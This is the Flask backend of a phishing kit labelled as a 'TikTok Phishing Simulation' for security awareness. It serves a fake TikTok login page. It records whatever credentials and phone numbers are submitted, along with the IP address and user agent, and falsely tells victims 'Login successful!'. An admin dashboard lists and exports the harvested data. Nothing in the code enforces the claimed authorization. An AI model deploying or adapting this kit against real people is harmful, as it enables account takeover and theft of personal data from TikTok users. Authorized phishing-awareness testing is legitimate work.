#!/usr/bin/env python3
"""
TikTok Phishing Simulation - Flask Backend
Authorized security awareness exercise
"""

import os
import json
import logging
from datetime import datetime
from flask import Flask, render_template, request, jsonify, redirect, url_for
from flask_cors import CORS

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('phishing_simulation.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = 'your-secret-key-change-in-production'
CORS(app)

# In-memory storage for submissions
submissions = []

@app.route('/')
def index():
    """Redirect to TikTok login page"""
    return redirect(url_for('tiktok_login'))

@app.route('/tiktok-login')
def tiktok_login():
    """Serve the TikTok login page"""
    try:
        return render_template('tiktok_login.html')
    except Exception as e:
        logger.error(f"Error serving TikTok login page: {e}")
        return "Error loading page", 500

@app.route('/submit-login', methods=['POST'])
def submit_login():
    """Handle login form submissions"""
    try:
        data = request.get_json()
        
        # Extract form data
        form_type = data.get('form_type', 'unknown')
        timestamp = datetime.now().isoformat()
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        # Create submission record
        submission = {
            'id': len(submissions) + 1,
            'timestamp': timestamp,
            'ip_address': ip_address,
            'user_agent': user_agent,
            'form_type': form_type,
            'data': data
        }
        
        # Add to submissions list
        submissions.append(submission)
        
        logger.info(f"Login submission received - Type: {form_type}, IP: {ip_address}")
        
        return jsonify({
            'success': True,
            'message': 'Login successful! Redirecting...',
            'submission_id': submission['id']
        })
        
    except Exception as e:
        logger.error(f"Error processing login submission: {e}")
        return jsonify({
            'success': False,
            'message': 'Error processing submission'
        }), 500

@app.route('/send-code', methods=['POST'])
def send_code():
    """Handle verification code sending"""
    try:
        data = request.get_json()
        
        # Extract phone data
        country_code = data.get('country_code', '')
        phone = data.get('phone', '')
        timestamp = datetime.now().isoformat()
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        # Create code sending record
        submission = {
            'id': len(submissions) + 1,
            'timestamp': timestamp,
            'ip_address': ip_address,
            'user_agent': user_agent,
            'form_type': 'code_sent',
            'data': {
                'country_code': country_code,
                'phone': phone,
                'status': 'Code sent'
            }
        }
        
        # Add to submissions list
        submissions.append(submission)
        
        logger.info(f"Verification code sent - Phone: {country_code}{phone}, IP: {ip_address}")
        
        return jsonify({
            'success': True,
            'message': 'Verification code sent!',
            'submission_id': submission['id']
        })
        
    except Exception as e:
        logger.error(f"Error processing code sending: {e}")
        return jsonify({
            'success': False,
            'message': 'Error sending code'
        }), 500

@app.route('/admin')
def admin_dashboard():
    """Admin dashboard to view submissions"""
    try:
        return render_template('admin.html')
    except Exception as e:
        logger.error(f"Error serving admin dashboard: {e}")
        return "Error loading admin dashboard", 500

@app.route('/admin/data')
def admin_data():
    """API endpoint to get submission data"""
    try:
        return jsonify({
            'total_submissions': len(submissions),
            'email_logins': len([s for s in submissions if s['form_type'] == 'email']),
            'phone_logins': len([s for s in submissions if s['form_type'] == 'phone']),
            'codes_sent': len([s for s in submissions if s['form_type'] == 'code_sent']),
            'submissions': submissions
        })
    except Exception as e:
        logger.error(f"Error serving admin data: {e}")
        return jsonify({'error': 'Failed to fetch data'}), 500

@app.route('/admin/clear', methods=['POST'])
def clear_data():
    """Clear all submission data"""
    try:
        global submissions
        submissions.clear()
        logger.info("All submission data cleared")
        return jsonify({'success': True, 'message': 'All data cleared'})
    except Exception as e:
        logger.error(f"Error clearing data: {e}")
        return jsonify({'success': False, 'message': 'Error clearing data'}), 500

@app.route('/admin/export')
def export_data():
    """Export submission data as JSON"""
    try:
        from flask import send_file
        import tempfile
        
        # Create temporary file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(submissions, f, indent=2)
            temp_path = f.name
        
        logger.info("Data exported successfully")
        return send_file(temp_path, as_attachment=True, download_name=f'tiktok_submissions_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json')
        
    except Exception as e:
        logger.error(f"Error exporting data: {e}")
        return jsonify({'error': 'Failed to export data'}), 500

@app.route('/health')
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'submissions_count': len(submissions)
    })

@app.errorhandler(404)
def not_found(error):
    """Handle 404 errors"""
    return jsonify({'error': 'Page not found'}), 404

@app.errorhandler(500)
def internal_error(error):
    """Handle 500 errors"""
    logger.error(f"Internal server error: {error}")
    return jsonify({'error': 'Internal server error'}), 500

if __name__ == '__main__':
    # Ensure templates directory exists
    os.makedirs('templates', exist_ok=True)
    
    logger.info("Starting TikTok Phishing Simulation Server")
    logger.info("Admin Dashboard: http://localhost:5000/admin")
    logger.info("TikTok Login Page: http://localhost:5000/tiktok-login")
    
    app.run(debug=True, host='0.0.0.0', port=5000)
